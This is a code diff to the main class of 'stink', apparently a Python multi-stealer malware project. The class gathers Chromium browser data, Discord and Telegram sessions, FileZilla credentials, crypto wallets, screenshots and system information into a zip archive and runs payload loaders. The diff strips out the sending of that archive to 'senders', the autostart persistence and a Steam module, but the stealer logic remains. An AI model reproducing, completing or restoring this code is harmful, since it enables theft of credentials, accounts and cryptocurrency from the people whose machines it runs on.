@@ -1,15 +1,15 @@
 import ssl
 from sys import argv
 from time import sleep
-from typing import List, Any
+from typing import List
 from threading import Thread
 from multiprocessing import Pool
 
 from stink.enums import Features, Utils, Protectors
 from stink.helpers import functions, MemoryStorage
 from stink.helpers.config import MultistealerConfig, Browsers
-from stink.utils import Autostart, Message, Protector, Loader, Grabber
-from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets
+from stink.utils import Message, Protector, Loader, Grabber
+from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Wallets
 
 
 class Stealer(Thread):
@@ -19,7 +19,6 @@ class Stealer(Thread):
 
     def __init__(
         self,
-        senders: List[Any] = None,
         features: List[Features] = None,
         utils: List[Utils] = None,
         loaders: List[Loader] = None,
@@ -42,9 +41,6 @@ class Stealer(Thread):
         if utils is None:
             utils = []
 
-        if senders is None:
-            senders = []
-
         if features is None:
             features = [Features.all]
 
@@ -53,8 +49,6 @@ class Stealer(Thread):
         else:
             self.__protectors = protectors
 
-        self.__senders = senders
-        self.__autostart = Utils.autostart in utils
         self.__message = Utils.message in utils
         self.__delay = delay
 
@@ -186,13 +180,6 @@ class Stealer(Thread):
                 "status": Features.filezilla in features or Features.all in features
             },
             {
-                "object": Steam,
-                "arguments": (
-                    "Programs/Steam",
-                ),
-                "status": Features.steam in features or Features.all in features
-            },
-            {
                 "object": Wallets,
                 "arguments": (
                     "Wallets",
@@ -238,16 +225,10 @@ class Stealer(Thread):
 
                 results += grabber_results
 
-            data = self.__storage.create_zip([file for files in results if files for file in files])
-
-            for sender in self.__senders:
-                sender.run(self.__config.ZipName, data)
+            self.__storage.create_zip([file for files in results if files for file in files])
 
             for loader in self.__loaders:
                 loader.run()
-
-            if self.__autostart is True:
-                Autostart(argv[0]).run()
 
         except Exception as e:
             print(f"[Multi stealer]: {repr(e)}")
